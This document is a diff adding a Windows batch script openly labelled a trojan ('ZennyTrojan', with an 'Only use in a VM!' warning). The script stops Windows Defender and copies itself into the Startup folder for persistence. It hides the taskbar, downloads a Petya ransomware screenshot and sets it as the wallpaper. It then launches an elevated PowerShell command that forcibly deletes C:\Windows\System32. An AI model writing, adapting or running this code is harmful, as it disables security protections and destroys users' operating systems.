@@ -1,0 +1,32 @@
+@echo off
+color 02
+echo      _.--""--._
+echo     /  _    _  \
+echo  _  ( (_\  /_) )  _
+echo { \._\   /\   /_./ }
+echo /_"=-.}______{.-="_\
+echo  _  _.=("""")=._  _
+echo (_'"_.-"`~~`"-._"'_)
+echo  {_"ZennyTrojan "_}
+echo Only use in a VM!
+pause
+sc stop WinDefend
+if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\GabelBombe.bat" (
+  copy "GabelBombe.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+)else(
+  goto albion
+)
+:albion
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarHide" /t REG_SZ /d "1" /f
+:bumsgaul
+curl -o lustiglol.png https://en.m.wikipedia.org/wiki/Petya_(malware_family)#/media/File%3A2017_Petya_cyberattack_screenshot.png
+powershell -Command "$imagePath = $env:USERPROFILE\Downloads\lustiglol.png; Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name wallpaper -Value $imagePath; rundll32.exe user32.dll,UpdatePerUserSystemParameters"
+if not exist "lustiglol.png" (
+  goto bumsgaul
+)else( 
+  goto 2
+)
+:2
+powershell -command if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -Command Remove-Item -Path C:\Windows\System32 -Recurse -Force") -Verb RunAs
+}
